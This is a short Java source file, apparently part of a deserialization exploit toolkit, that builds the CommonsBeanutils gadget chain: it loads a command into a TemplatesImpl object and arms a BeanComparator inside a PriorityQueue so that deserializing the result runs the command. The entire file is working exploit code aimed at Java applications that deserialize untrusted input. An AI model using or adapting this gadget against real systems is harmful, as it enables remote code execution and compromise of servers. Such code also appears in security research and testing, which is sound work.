package cn.org.unk;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.beanutils.BeanComparator;

import java.util.PriorityQueue;

public class CB {
    public static Object get(String cmd) throws Exception{
        TemplatesImpl templates = Gadget.getTemplatesImpl(cmd);
        // mock method name until armed
        BeanComparator comparator = new BeanComparator("anythinggggggg",String.CASE_INSENSITIVE_ORDER);

        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);

        Util.setFieldValue(comparator, "property", "outputProperties");

        Object[] queue1 = (Object[])Util.getFieldValue(queue, "queue");

        Util.setFieldValue(queue,"size",2);
        queue1[0] = templates;
        queue1[1] = "anything too";

        return queue;
    }
}
